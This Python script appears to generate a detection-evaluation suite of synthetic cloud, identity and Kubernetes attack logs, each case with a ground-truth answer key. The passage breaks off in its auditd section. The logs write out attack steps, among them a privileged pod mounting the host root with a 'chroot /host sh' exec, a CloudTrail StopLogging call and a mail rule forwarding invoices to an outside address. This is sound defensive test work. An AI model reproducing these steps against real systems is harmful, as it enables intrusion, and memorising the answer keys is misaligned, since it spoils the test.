#!/usr/bin/env python3
"""Generer les cas d'evaluation cloud, identite, Kubernetes et Linux auditd.

Les journaux sont synthetiques mais suivent les formats reels (Graph /
portail Entra ID, export Purview du Unified Audit Log, CloudTrail Records[]
en .json.gz, GCP Cloud Audit Logs et audit Kubernetes en JSON lines,
audit.log). La generation est deterministe (graine fixe, horodatages
fixes, gzip sans date) : relancer le script reproduit les fichiers a
l'identique.

    python eval/build_cloud_cases.py            # ecrit dans eval/suite/
    python eval/build_cloud_cases.py -o DOSSIER
"""

import argparse
import csv
import datetime
import gzip
import io
import json
import os
import random

SUITE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'suite')
DOMAIN = 'nordbridge.fr'
TENANT = '6f1c2d4b-8e3a-4b7c-9d21-5a0e7f3c1b88'


def _ts(base, minutes=0, seconds=0, fmt='%Y-%m-%dT%H:%M:%SZ'):
    return (base + datetime.timedelta(minutes=minutes, seconds=seconds)).strftime(fmt)


def _write(case_dir, name, text, binary=False):
    os.makedirs(case_dir, exist_ok=True)
    with open(os.path.join(case_dir, name), 'wb' if binary else 'w', encoding=None if binary else 'utf-8',
              newline=None if binary else '\n') as f:
        f.write(text)


def _truth(case_dir, truth):
    _write(case_dir, 'ground_truth.json', json.dumps(truth, indent=2, ensure_ascii=False) + '\n')


def _uuid(rng):
    return '%08x-%04x-4%03x-%04x-%012x' % (rng.getrandbits(32), rng.getrandbits(16), rng.getrandbits(12),
                                         0x8000 | rng.getrandbits(14), rng.getrandbits(48))


# ============================================================================
# 1. M365 : spray, fatigue MFA, consentement OAuth, regle de transfert (BEC)
# ============================================================================

USERS = ['a.martin', 'j.dubois', 'c.bernard', 'l.petit', 's.moreau', 'm.leroy', 'p.roux', 'e.fournier']
PARIS = {'city': 'Paris', 'state': 'Ile-de-France', 'countryOrRegion': 'FR',
         'geoCoordinates': {'latitude': 48.8566, 'longitude': 2.3522}}
LAGOS = {'city': 'Lagos', 'state': 'Lagos', 'countryOrRegion': 'NG',
         'geoCoordinates': {'latitude': 6.5244, 'longitude': 3.3792}}
OFFICE_IP = '81.250.12.34'
ATTACKER_M365 = '102.89.47.13'
EDGE_UA = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
           'Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0')
ATTACKER_UA = 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'


def _signin(rng, when, user, ip, loc, error=0, req='multiFactorAuthentication', detail=None,
            app='Office 365 Exchange Online', ua=EDGE_UA, client='Browser', reason=None):
    details = []
    if detail:
        details.append({'authenticationMethod': 'Mobile app notification',
                        'authenticationStepResultDetail': detail, 'succeeded': error == 0})
    return {
        'id': _uuid(rng), 'createdDateTime': when, 'userPrincipalName': f'{user}@{DOMAIN}',
        'userDisplayName': user.replace('.', ' ').title(), 'appDisplayName': app,
        'resourceDisplayName': app, 'ipAddress': ip, 'clientAppUsed': client, 'userAgent': ua,
        'correlationId': _uuid(rng), 'conditionalAccessStatus': 'success' if error == 0 else 'notApplied',
        'isInteractive': True, 'authenticationRequirement': req, 'resourceTenantId': TENANT,
        'homeTenantId': TENANT, 'riskLevelDuringSignIn': 'none',
        'status': {'errorCode': error, 'failureReason': reason or ('Other.' if error else None)},
        'location': loc, 'authenticationDetails': details,
    }


def build_m365(out):
    rng = random.Random(1365)
    case = os.path.join(out, 'cloud_m365_bec_oauth')
    day0 = datetime.datetime(2026, 10, 10, 7, 30)
    signins = []
    # Bruit : trois jours de connexions MFA depuis le bureau parisien
    for d in range(3):
        for i, user in enumerate(USERS):
            when = _ts(day0 + datetime.timedelta(days=d), minutes=i * 7 + rng.randint(0, 5))
            signins.append(_signin(rng, when, user, OFFICE_IP, PARIS, detail='MFA successfully completed'))
            later = _ts(day0 + datetime.timedelta(days=d), minutes=300 + i * 11)
            signins.append(_signin(rng, later, user, OFFICE_IP, PARIS, req='singleFactorAuthentication',
                                   app='Microsoft Teams', client='Mobile Apps and Desktop clients'))
    signins.append(_signin(rng, _ts(day0, minutes=95), 'p.roux', OFFICE_IP, PARIS, error=50126,
                           req='singleFactorAuthentication', reason='Invalid username or password.'))
    attack = datetime.datetime(2026, 10, 12, 7, 58)
    signins.append(_signin(rng, _ts(attack), 'a.martin', OFFICE_IP, PARIS, detail='MFA successfully completed'))
    # Pulverisation de mots de passe : un essai par compte depuis Lagos
    for i, user in enumerate(USERS):
        signins.append(_signin(rng, _ts(attack, minutes=12, seconds=i * 23), user, ATTACKER_M365, LAGOS,
                               error=50126, req='singleFactorAuthentication', ua=ATTACKER_UA,
                               reason='Invalid username or password or Invalid on-premise username or password.'))
    # Fatigue MFA puis acceptation
    for i in range(6):
        detail = 'MFA denied; user declined the authentication' if i % 2 else \
            'MFA denied; user did not respond to mobile app notification'
        signins.append(_signin(rng, _ts(attack, minutes=22 + i * 2), 'a.martin', ATTACKER_M365, LAGOS,
                               error=500121, detail=detail, ua=ATTACKER_UA,
                               reason='Authentication failed during strong authentication request.'))
    signins.append(_signin(rng, _ts(attack, minutes=35), 'a.martin', ATTACKER_M365, LAGOS,
                           detail='MFA successfully completed', ua=ATTACKER_UA))
    signins.sort(key=lambda s: s['createdDateTime'])
    _write(case, 'entra_signins.json', json.dumps(
        {'@odata.context': 'https://graph.microsoft.com/v1.0/$metadata#auditLogs/signIns', 'value': signins},
        indent=1) + '\n')

    # Unified Audit Log (export Purview)
    rows = []

    def ual(when, op, user, workload, record_type, ip, **extra):
        audit = {'CreationTime': when[:-1], 'Id': _uuid(rng), 'Operation': op, 'OrganizationId': TENANT,
                 'RecordType': record_type, 'ResultStatus': extra.pop('ResultStatus', 'Succeeded'),
                 'UserKey': f'1003200{rng.randint(1000000, 9999999)}', 'UserType': 0, 'Version': 1,
                 'Workload': workload, 'ClientIP': ip, 'UserId': user}
        audit.update(extra)
        rows.append({'RecordId': audit['Id'], 'CreationDate': when, 'RecordType': record_type, 'Operation': op,
                     'UserId': user, 'AuditData': json.dumps(audit, separators=(',', ':')),
                     'AssociatedAdminUnits': '', 'AssociatedAdminUnitsNames': ''})

    for d in range(3):
        base = day0 + datetime.timedelta(days=d, hours=1)
        for i, user in enumerate(USERS):
            upn = f'{user}@{DOMAIN}'
            ual(_ts(base, minutes=i * 5), 'MailItemsAccessed', upn, 'Exchange', 50, OFFICE_IP,
                MailAccessType='Bind', ClientInfoString='Client=OWA;Action=ViewAction;')
            ual(_ts(base, minutes=i * 5 + 2), 'FileAccessed', upn, 'SharePoint', 6, OFFICE_IP,
                ObjectId=f'https://nordbridge.sharepoint.com/sites/Finance/Shared Documents/budget_{i}.xlsx',
                UserAgent=EDGE_UA)
            ual(_ts(base, minutes=i * 5 + 3), 'Send', upn, 'Exchange', 2, OFFICE_IP,
                Item={'Subject': 'Point hebdo', 'ParentFolder': {'Path': '\\Sent Items'}})
    # Regle legitime : classement des newsletters
    ual(_ts(day0, minutes=200), 'New-InboxRule', f'j.dubois@{DOMAIN}', 'Exchange', 1, f'{OFFICE_IP}:51234',
        ObjectId=f'j.dubois@{DOMAIN}\\Newsletters',
        Parameters=[{'Name': 'Name', 'Value': 'Newsletters'}, {'Name': 'From', 'Value': f'news@{DOMAIN}'},
                    {'Name': 'MoveToFolder', 'Value': 'Newsletters'},
                    {'Name': 'StopProcessingRules', 'Value': 'True'}])
    victim = f'a.martin@{DOMAIN}'
    ual(_ts(attack, minutes=35), 'UserLoggedIn', victim, 'AzureActiveDirectory', 15, ATTACKER_M365,
        ExtendedProperties=[{'Name': 'UserAgent', 'Value': ATTACKER_UA},
                            {'Name': 'RequestType', 'Value': 'OAuth2:Authorize'},
                            {'Name': 'ResultStatusDetail', 'Value': 'Success'}])
    scope = 'Mail.Read Mail.ReadWrite Mail.Send offline_access User.Read'
    ual(_ts(attack, minutes=41), 'Consent to application.', victim, 'AzureActiveDirectory', 8, ATTACKER_M365,
        ResultStatus='Success', ObjectId='ServicePrincipal_3f9a1c22-7b45-4e1d-a0c6-2d8e9b7f5a13',
        Target=[{'ID': 'ServicePrincipal_3f9a1c22-7b45-4e1d-a0c6-2d8e9b7f5a13', 'Type': 2},
                {'ID': 'MailSync Pro', 'Type': 1}],
        ModifiedProperties=[
            {'Name': 'ConsentContext.IsAdminConsent', 'NewValue': 'False', 'OldValue': ''},
            {'Name': 'ConsentContext.IsAppOnly', 'NewValue': 'False', 'OldValue': ''},
            {'Name': 'ConsentAction.Permissions', 'OldValue': '',
             'NewValue': ('[] => [[Id: Ihf9P0V7HU6gxi2Om39aE, ClientId: 3f9a1c22-7b45-4e1d-a0c6-2d8e9b7f5a13, '
                          'ConsentType: Principal, Scope: ' + scope + ', CreatedDateTime: , '
                          'LastModifiedDateTime: ]]')},
            {'Name': 'TargetId.ServicePrincipalNames', 'NewValue': 'https://mailsync-pro.app', 'OldValue': ''}])
    ual(_ts(attack, minutes=47), 'New-InboxRule', victim, 'Exchange', 1, f'{ATTACKER_M365}:40112',
        ObjectId=f'{victim}\\.',
        Parameters=[{'Name': 'Name', 'Value': '.'},
                    {'Name': 'SubjectOrBodyContainsWords', 'Value': 'facture;virement;payment;IBAN'},
                    {'Name': 'ForwardTo', 'Value': 'compta.nordbridge@proton.me'},
                    {'Name': 'MoveToFolder', 'Value': 'RSS Subscriptions'},
                    {'Name': 'MarkAsRead', 'Value': 'True'},
                    {'Name': 'StopProcessingRules', 'Value': 'True'}])
    for i in range(12):
        ual(_ts(attack, minutes=50 + i), 'MailItemsAccessed', victim, 'Exchange', 50, ATTACKER_M365,
            MailAccessType='Sync', ClientInfoString='Client=REST;Client=RESTSystem;MailSync Pro;',
            AppId='3f9a1c22-7b45-4e1d-a0c6-2d8e9b7f5a13')
    rows.sort(key=lambda r: r['CreationDate'])
    buf = io.StringIO()
    writer = csv.DictWriter(buf, fieldnames=list(rows[0]), lineterminator='\n')
    writer.writeheader()
    writer.writerows(rows)
    _write(case, 'm365_unified_audit_log.csv', buf.getvalue())
    _truth(case, {
        'description': ("Pulverisation de mots de passe depuis 102.89.47.13 (Lagos) sur 8 comptes, fatigue MFA "
                        "sur a.martin qui finit par valider, voyage impossible Paris -> Lagos, consentement OAuth "
                        "a l'application MailSync Pro (Mail.Read, Mail.ReadWrite, Mail.Send, offline_access) puis "
                        "regle de boite aux lettres '.' transferant les factures vers compta.nordbridge@proton.me "
                        "et les masquant dans RSS Subscriptions."),
        'techniques': ['T1110.003', 'T1621', 'T1078.004', 'T1528', 'T1114.003'],
        'forbidden_techniques': ['T1486', 'T1003', 'T1059', 'T1543'],
        'iocs': [ATTACKER_M365, 'compta.nordbridge@proton.me'],
        'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': 'Quel compte a ete compromis ?', 'answer': [victim, 'a.martin'],
             'related': ['fatigue MFA', 'MFA']},
            {'id': 'Q2', 'question': "Depuis quelle IP l'attaquant opere-t-il ?", 'answer': [ATTACKER_M365],
             'related': ['Lagos', 'pulverisation', 'spray']},
            {'id': 'Q3', 'question': "Quelle application OAuth a recu le consentement ?",
             'answer': ['MailSync Pro'], 'related': ['consentement', 'OAuth', 'Mail.Read']},
            {'id': 'Q4', 'question': 'Vers quelle adresse les messages sont-ils transferes ?',
             'answer': ['compta.nordbridge@proton.me'], 'related': ['regle', 'inbox rule', 'transfert']},
        ],
    })


# ============================================================================
# 2. AWS : cle d'acces divulguee, StopLogging, persistance IAM, exfiltration S3
# ============================================================================

ACCOUNT = '418295730216'
CI_KEY = 'AKIAQ7NBEXAMPLE3KD5Q'
ATTACKER_AWS = '185.243.115.84'
CI_IP = '52.47.112.9'


def _ct(rng, when, name, source, identity, ip, ua, region='eu-west-3', req=None, resp=None, error=None,
        read_only=None, extra=None, event_type='AwsApiCall'):
    rec = {'eventVersion': '1.09', 'userIdentity': identity, 'eventTime': when, 'eventSource': source,
           'eventName': name, 'awsRegion': region, 'sourceIPAddress': ip, 'userAgent': ua,
           'requestParameters': req, 'responseElements': resp, 'requestID': _uuid(rng), 'eventID': _uuid(rng),
           'readOnly': read_only if read_only is not None else name.startswith(('Get', 'List', 'Describe')),
           'eventType': event_type, 'managementEvent': source != 's3.amazonaws.com' or name not in (
               'GetObject', 'PutObject'), 'recipientAccountId': ACCOUNT, 'eventCategory': 'Management'}
    if error:
        rec['errorCode'], rec['errorMessage'] = error, 'Access Denied'
    if extra:
        rec['additionalEventData'] = extra
    return rec


def build_aws(out):
    rng = random.Random(2026)
    case = os.path.join(out, 'cloud_aws_key_compromise')
    ci = {'type': 'IAMUser', 'principalId': 'AIDAQ7NBCIDEPLOY0001', 'arn': f'arn:aws:iam::{ACCOUNT}:user/ci-deploy',
          'accountId': ACCOUNT, 'accessKeyId': CI_KEY, 'userName': 'ci-deploy'}
    alice = {'type': 'IAMUser', 'principalId': 'AIDAQ7NBALICEADM0002',
             'arn': f'arn:aws:iam::{ACCOUNT}:user/alice.admin',
             'accountId': ACCOUNT, 'accessKeyId': 'ASIAQ7NBALICESESS01', 'userName': 'alice.admin',
             'sessionContext': {'attributes': {'mfaAuthenticated': 'true'}}}
    app = {'type': 'AssumedRole', 'principalId': 'AROAQ7NBAPPBACKEND:i-0a1b2c3d4e5f60718',
           'arn': f'arn:aws:sts::{ACCOUNT}:assumed-role/app-backend/i-0a1b2c3d4e5f60718', 'accountId': ACCOUNT,
           'accessKeyId': 'ASIAQ7NBAPPSESSION1',
           'sessionContext': {'sessionIssuer': {'type': 'Role', 'userName': 'app-backend'}}}
    tf_ua = 'APN/1.0 HashiCorp/1.0 Terraform/1.9.5 (+https://www.terraform.io) aws-sdk-go-v2/1.30.3'
    console_ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 Safari/605.1.15'
    records = []
    day0 = datetime.datetime(2026, 10, 11, 8, 0)
    for d in range(3):
        base = day0 + datetime.timedelta(days=d)
        records.append(_ct(rng, _ts(base, minutes=2), 'ConsoleLogin', 'signin.amazonaws.com',
                           {k: v for k, v in alice.items() if k != 'accessKeyId'}, '81.250.12.34', console_ua,
                           region='us-east-1', resp={'ConsoleLogin': 'Success'},
                           extra={'LoginTo': 'https://console.aws.amazon.com/', 'MobileVersion': 'No',
                                  'MFAUsed': 'Yes'}))
        for i in range(25):
            name = ['DescribeInstances', 'DescribeSecurityGroups', 'ListBuckets', 'DescribeAlarms',
                    'GetMetricData'][i % 5]
            src = {'DescribeInstances': 'ec2', 'DescribeSecurityGroups': 'ec2', 'ListBuckets': 's3',
                   'DescribeAlarms': 'monitoring', 'GetMetricData': 'monitoring'}[name] + '.amazonaws.com'
            records.append(_ct(rng, _ts(base, minutes=5 + i * 3), name, src, alice, '81.250.12.34', console_ua))
        for i in range(6):
            when = _ts(base, minutes=120 + i * 10)
            for name, src, req in (('GetCallerIdentity', 'sts.amazonaws.com', None),
                                   ('DescribeLaunchTemplates', 'ec2.amazonaws.com', None),
                                   ('UpdateAutoScalingGroup', 'autoscaling.amazonaws.com',
                                    {'autoScalingGroupName': 'web-asg', 'desiredCapacity': 3}),
                                   ('PutObject', 's3.amazonaws.com',
                                    {'bucketName': 'nb-deploy-artifacts', 'key': f'releases/build-{d}{i}.zip'})):
                records.append(_ct(rng, when, name, src, ci, CI_IP, tf_ua, req=req))
        for i in range(15):
            records.append(_ct(rng, _ts(base, minutes=30 + i * 20), 'GetObject', 's3.amazonaws.com', app,
                               '10.0.12.45', '[aws-sdk-java/2.25.0]',
                               req={'bucketName': 'nb-app-assets', 'key': f'img/logo_{i}.png'}))
    attack = datetime.datetime(2026, 10, 13, 14, 2)
    kali = 'Boto3/1.34.162 md/Botocore#1.34.162 ua/2.0 os/linux#6.6.15-kali-amd64 lang/python#3.11.9'
    seq = [
        (0, 'GetCallerIdentity', 'sts.amazonaws.com', None, None),
        (1, 'ListBuckets', 's3.amazonaws.com', None, None),
        (1, 'ListUsers', 'iam.amazonaws.com', None, None),
        (2, 'ListAttachedUserPolicies', 'iam.amazonaws.com', {'userName': 'ci-deploy'}, None),
        (3, 'StopLogging', 'cloudtrail.amazonaws.com',
         {'name': f'arn:aws:cloudtrail:eu-west-3:{ACCOUNT}:trail/org-trail'}, None),
        (5, 'CreateAccessKey', 'iam.amazonaws.com', {'userName': 'backup-svc'},
         {'accessKey': {'userName': 'backup-svc', 'accessKeyId': 'AKIAQ7NBEXAMPLE9ZB2T', 'status': 'Active'}}),
        (6, 'AttachUserPolicy', 'iam.amazonaws.com',
         {'userName': 'backup-svc', 'policyArn': 'arn:aws:iam::aws:policy/AdministratorAccess'}, None),
    ]
    for minute, name, src, req, resp in seq:
        region = 'us-east-1' if src in ('iam.amazonaws.com', 'sts.amazonaws.com') else 'eu-west-3'
        records.append(_ct(rng, _ts(attack, minutes=minute), name, src, ci, ATTACKER_AWS, kali, region=region,
                           req=req, resp=resp))
    for i in range(40):
        records.append(_ct(rng, _ts(attack, minutes=10, seconds=i * 11), 'GetObject', 's3.amazonaws.com', ci,
                           ATTACKER_AWS, kali, req={'bucketName': 'nb-finance-reports',
                                                    'key': f'compta/2026/releve_{i:03d}.pdf'}))
    records.sort(key=lambda r: r['eventTime'])
    raw = json.dumps({'Records': records}, separators=(',', ':')).encode('utf-8')
    buf = io.BytesIO()
    with gzip.GzipFile(filename='', mode='wb', fileobj=buf, mtime=0) as gz:
        gz.write(raw)
    _write(case, f'{ACCOUNT}_CloudTrail_eu-west-3_20261013.json.gz', buf.getvalue(), binary=True)
    _truth(case, {
        'description': ("La cle d'acces longue duree du compte ci-deploy est utilisee depuis 185.243.115.84 "
                        "(Boto3 sous Kali) : reconnaissance, StopLogging du trail org-trail, CreateAccessKey et "
                        "AdministratorAccess pour l'utilisateur backup-svc, puis telechargement de 40 objets du "
                        "bucket nb-finance-reports."),
        'techniques': ['T1078.004', 'T1562.008', 'T1098.001', 'T1098.003', 'T1530'],
        'forbidden_techniques': ['T1110', 'T1486', 'T1621'],
        'iocs': [ATTACKER_AWS, CI_KEY],
        'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': "Quelle cle d'acces a ete compromise ?", 'answer': [CI_KEY],
             'related': ['ci-deploy']},
            {'id': 'Q2', 'question': "Depuis quelle IP l'attaquant utilise-t-il la cle ?", 'answer': [ATTACKER_AWS],
             'related': ['Kali', 'Boto3']},
            {'id': 'Q3', 'question': 'Quel trail CloudTrail a ete arrete ?', 'answer': ['org-trail'],
             'related': ['StopLogging']},
            {'id': 'Q4', 'question': "Quel utilisateur IAM sert de persistance ?", 'answer': ['backup-svc'],
             'related': ['CreateAccessKey', 'AdministratorAccess']},
            {'id': 'Q5', 'question': 'Quel bucket a ete exfiltre ?', 'answer': ['nb-finance-reports'],
             'related': ['GetObject', 'S3']},
        ],
    })


# ============================================================================
# 3. GCP : role owner accorde a un compte externe, cle de compte de service
# ============================================================================

def build_gcp(out):
    rng = random.Random(77)
    case = os.path.join(out, 'cloud_gcp_external_owner')
    project = 'nb-data-prod'
    lines = []

    def entry(when, method, service, who, ip, resource, ua='google-cloud-sdk gcloud/492.0.0', extra=None,
              code=None, log='activity'):
        pp = {'@type': 'type.googleapis.com/google.cloud.audit.AuditLog',
              'authenticationInfo': {'principalEmail': who},
              'requestMetadata': {'callerIp': ip, 'callerSuppliedUserAgent': ua},
              'serviceName': service, 'methodName': method, 'resourceName': resource}
        if code:
            pp['status'] = {'code': code, 'message': 'PERMISSION_DENIED'}
        pp.update(extra or {})
        lines.append({'protoPayload': pp, 'insertId': _uuid(rng)[:12],
                      'resource': {'type': 'project', 'labels': {'project_id': project}},
                      'timestamp': when, 'severity': 'NOTICE',
                      'logName': f'projects/{project}/logs/cloudaudit.googleapis.com%2F{log}',
                      'receiveTimestamp': when})

    day0 = datetime.datetime(2026, 10, 12, 9, 0)
    admins = [f'dev.ops@{DOMAIN}', f'data.eng@{DOMAIN}']
    for d in range(2):
        base = day0 + datetime.timedelta(days=d)
        for i in range(30):
            who = admins[i % 2]
            method, service, res = [
                ('v1.compute.instances.list', 'compute.googleapis.com',
                 f'projects/{project}/zones/europe-west9-a/instances'),
                ('storage.objects.get', 'storage.googleapis.com',
                 f'projects/_/buckets/nb-datalake/objects/raw/{i}.parquet'),
                ('google.cloud.bigquery.v2.JobService.InsertJob', 'bigquery.googleapis.com',
                 f'projects/{project}/jobs/job_{d}{i}'),
            ][i % 3]
            entry(_ts(base, minutes=i * 9), method, service, who, '81.250.12.34', res,
                  log='data_access' if 'get' in method or 'list' in method else 'activity')
    entry(_ts(day0, minutes=300), 'SetIamPolicy', 'cloudresourcemanager.googleapis.com', admins[0], '81.250.12.34',
          f'projects/{project}', extra={'serviceData': {
              '@type': 'type.googleapis.com/google.iam.v1.logging.AuditData',
              'policyDelta': {'bindingDeltas': [{'action': 'ADD', 'role': 'roles/viewer',
                                                 'member': f'user:stagiaire@{DOMAIN}'}]}}})
    attack = datetime.datetime(2026, 10, 13, 22, 14)
    ip = '91.92.248.17'
    ua = 'python-requests/2.32.3'
    entry(_ts(attack), 'SetIamPolicy', 'cloudresourcemanager.googleapis.com', admins[0], ip,
          f'projects/{project}', ua=ua, extra={'serviceData': {
              '@type': 'type.googleapis.com/google.iam.v1.logging.AuditData',
              'policyDelta': {'bindingDeltas': [{'action': 'ADD', 'role': 'roles/owner',
                                                 'member': 'user:backup.nb.admin@gmail.com'}]}}})
    sa = f'etl-runner@{project}.iam.gserviceaccount.com'
    entry(_ts(attack, minutes=3), 'google.iam.admin.v1.CreateServiceAccountKey', 'iam.googleapis.com', admins[0], ip,
          f'projects/-/serviceAccounts/{sa}', ua=ua,
          extra={'request': {'name': f'projects/-/serviceAccounts/{sa}', 'private_key_type': 2}})
    entry(_ts(attack, minutes=6), 'google.logging.v2.ConfigServiceV2.DeleteSink', 'logging.googleapis.com', admins[0],
          ip, f'projects/{project}/sinks/siem-export', ua=ua)
    lines.sort(key=lambda r: r['timestamp'])
    _write(case, 'gcp_audit_nb-data-prod.jsonl', ''.join(json.dumps(r, separators=(',', ':')) + '\n' for r in lines))
    _truth(case, {
        'description': ("Le compte dev.ops est utilise depuis 91.92.248.17 (python-requests) : role roles/owner "
                        "accorde a backup.nb.admin@gmail.com, cle creee pour le compte de service etl-runner, puis "
                        "suppression du puits de logs siem-export."),
        'techniques': ['T1098.003', 'T1098.001', 'T1562.008'],
        'forbidden_techniques': ['T1110', 'T1486', 'T1611'],
        'iocs': ['91.92.248.17', 'backup.nb.admin@gmail.com'],
        'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': 'Quel principal externe a recu le role owner ?',
             'answer': ['backup.nb.admin@gmail.com'], 'related': ['roles/owner', 'SetIamPolicy']},
            {'id': 'Q2', 'question': 'Pour quel compte de service une cle a-t-elle ete creee ?',
             'answer': ['etl-runner', sa], 'related': ['CreateServiceAccountKey']},
            {'id': 'Q3', 'question': 'Quel puits de journalisation a ete supprime ?', 'answer': ['siem-export'],
             'related': ['DeleteSink']},
        ],
    })


# ============================================================================
# 4. Kubernetes : compte de service compromis, pod privilegie, cluster-admin
# ============================================================================

def build_k8s(out):
    rng = random.Random(8)
    case = os.path.join(out, 'k8s_privileged_escape')
    lines = []

    def audit(when, user, verb, resource, ns=None, name=None, sub=None, code=200, ips=('10.42.0.1',),
              ua='kubectl/v1.31.1 (linux/amd64) kubernetes/948afe5', groups=None, req=None, both=True, uri=None):
        aid = _uuid(rng)
        obj = {'resource': resource, 'apiVersion': 'v1' if resource in ('pods', 'secrets', 'configmaps') else 'apps/v1'}
        if resource.endswith('rolebindings'):
            obj['apiGroup'], obj['apiVersion'] = 'rbac.authorization.k8s.io', 'v1'
        for k, v in (('namespace', ns), ('name', name), ('subresource', sub)):
            if v:
                obj[k] = v
        path = uri or ('/api/v1/' + (f'namespaces/{ns}/' if ns else '') + resource + (f'/{name}' if name else '')
                       + (f'/{sub}' if sub else ''))
        base = {'kind': 'Event', 'apiVersion': 'audit.k8s.io/v1', 'level': 'RequestResponse', 'auditID': aid,
                'requestURI': path, 'verb': verb,
                'user': {'username': user, 'groups': groups or ['system:authenticated']},
                'sourceIPs': list(ips), 'userAgent': ua, 'objectRef': obj,
                'requestReceivedTimestamp': when, 'stageTimestamp': when}
        if both:
            lines.append(dict(base, stage='RequestReceived'))
        done = dict(base, stage='ResponseComplete', responseStatus={'metadata': {}, 'code': code})
        if req:
            done['requestObject'] = req
        lines.append(done)

    day0 = datetime.datetime(2026, 10, 14, 6, 0)
    for i in range(40):
        when = _ts(day0, minutes=i * 6, fmt='%Y-%m-%dT%H:%M:%S.000000Z')
        audit(when, 'system:kube-controller-manager', 'list', 'secrets', ua='kube-controller-manager/v1.31.1',
              groups=['system:authenticated'], both=False)
        audit(when, 'system:node:worker-1', 'get', 'configmaps', ns='kube-system', name='kube-proxy',
              ua='kubelet/v1.31.1', groups=['system:nodes', 'system:authenticated'], both=False)
        audit(when, 'system:serviceaccount:monitoring:prometheus', 'get', 'secrets', ns='monitoring',
              name='prometheus-tls', ua='prometheus/2.54.1', both=False)
        if i % 4 == 0:
            audit(when, f'oidc:ops@{DOMAIN}', 'get', 'pods', ns='web', ips=('81.250.12.34',))
            audit(when, f'oidc:ops@{DOMAIN}', 'patch', 'deployments', ns='web', name='frontend', ips=('81.250.12.34',),
                  req={'spec': {'replicas': 3}})
    audit(_ts(day0, minutes=30, fmt='%Y-%m-%dT%H:%M:%S.000000Z'),
          'system:serviceaccount:kube-system:daemon-set-controller', 'create', 'pods', ns='kube-system',
          name='calico-node-x7k2p', ua='kube-controller-manager/v1.31.1',
          req={'kind': 'Pod', 'spec': {'hostNetwork': True, 'containers': [
              {'name': 'calico-node', 'image': 'calico/node:v3.28.1', 'securityContext': {'privileged': True}}],
              'volumes': [{'name': 'lib-modules', 'hostPath': {'path': '/lib/modules'}}]}})
    sa = 'system:serviceaccount:web:frontend'
    pod_ip = ('10.42.3.17',)
    pod_ua = 'curl/8.5.0'
    attack = datetime.datetime(2026, 10, 14, 9, 41)
    fmt = '%Y-%m-%dT%H:%M:%S.000000Z'
    audit(_ts(attack, fmt=fmt), sa, 'list', 'secrets', ips=pod_ip, ua=pod_ua,
          groups=['system:serviceaccounts', 'system:serviceaccounts:web', 'system:authenticated'])
    audit(_ts(attack, minutes=1, fmt=fmt), sa, 'get', 'secrets', ns='kube-system', name='admin-token-9f2xq',
          ips=pod_ip, ua=pod_ua,
          groups=['system:serviceaccounts', 'system:serviceaccounts:web', 'system:authenticated'])
    audit(_ts(attack, minutes=3, fmt=fmt), sa, 'create', 'pods', ns='default', name='debug-node', code=201,
          ips=pod_ip, ua=pod_ua, groups=['system:serviceaccounts', 'system:authenticated'],
          req={'apiVersion': 'v1', 'kind': 'Pod', 'metadata': {'name': 'debug-node', 'namespace': 'default'},
               'spec': {'hostPID': True, 'hostNetwork': True, 'containers': [
                   {'name': 'shell', 'image': 'alpine:3.20', 'command': ['sleep', '86400'],
                    'securityContext': {'privileged': True},
                    'volumeMounts': [{'name': 'host', 'mountPath': '/host'}]}],
                   'volumes': [{'name': 'host', 'hostPath': {'path': '/'}}]}})
    audit(_ts(attack, minutes=5, fmt=fmt), sa, 'create', 'pods', ns='default', name='debug-node', sub='exec',
          code=101, ips=pod_ip, ua=pod_ua, groups=['system:serviceaccounts', 'system:authenticated'],
          uri=('/api/v1/namespaces/default/pods/debug-node/exec?command=chroot&command=%2Fhost&command=sh'
               '&stdin=true&tty=true'))
    audit(_ts(attack, minutes=8, fmt=fmt), sa, 'create', 'clusterrolebindings', name='web-admin', code=201,
          ips=pod_ip, ua=pod_ua, groups=['system:serviceaccounts', 'system:authenticated'],
          uri='/apis/rbac.authorization.k8s.io/v1/clusterrolebindings',
          req={'kind': 'ClusterRoleBinding', 'metadata': {'name': 'web-admin'},
               'roleRef': {'apiGroup': 'rbac.authorization.k8s.io', 'kind': 'ClusterRole', 'name': 'cluster-admin'},
               'subjects': [{'kind': 'ServiceAccount', 'name': 'frontend', 'namespace': 'web'}]})
    lines.sort(key=lambda r: (r['requestReceivedTimestamp'], r['stage'] != 'RequestReceived'))
    _write(case, 'kube-apiserver-audit.log', ''.join(json.dumps(r, separators=(',', ':')) + '\n' for r in lines))
    _truth(case, {
        'description': ("Le compte de service web/frontend (pod compromis 10.42.3.17) enumere les secrets du "
                        "cluster, cree le pod privilegie debug-node (hostPID, hostNetwork, hostPath /), s'y "
                        "connecte par exec (chroot /host) et se lie a cluster-admin via la liaison web-admin."),
        'techniques': ['T1552.007', 'T1611', 'T1609', 'T1098.006'],
        'forbidden_techniques': ['T1110', 'T1486', 'T1621'],
        'iocs': ['debug-node', 'web-admin'],
        'expect_injection': False, 'benign': False,
        'facts': [
            {'id': 'Q1', 'question': "Quel compte a mene l'attaque ?",
             'answer': [sa, 'web:frontend', 'web/frontend'], 'related': ['serviceaccount']},
            {'id': 'Q2', 'question': 'Quel pod privilegie a ete cree ?', 'answer': ['debug-node'],
             'related': ['privileged', 'hostPath']},
            {'id': 'Q3', 'question': 'Quelle liaison donne cluster-admin ?', 'answer': ['web-admin'],
             'related': ['cluster-admin', 'clusterrolebinding']},
        ],
    })


# ============================================================================
# 5. Linux auditd : webshell, persistance SSH / sudoers, sabotage d'auditd
# ============================================================================

def build_auditd(out):
    case = os.path.join(out, 'linux_auditd_persistence')
    lines = []
    serial = [5000]
    base_epoch = int(datetime.datetime(2026, 10, 15, 0, 0, tzinfo=datetime.timezone.utc).timestamp())

    def hexs(text):
        return text.encode().hex().upper()

    def ev(offset, records):
        serial[0] += 1
        stamp = f'{base_epoch + offset}.{(serial[0] * 37) % 1000:03d}:{serial[0]}'
        for rtype, body in records:
            lines.append(f'type={rtype} msg=audit({stamp}): {body}')
        if len(records) > 1:
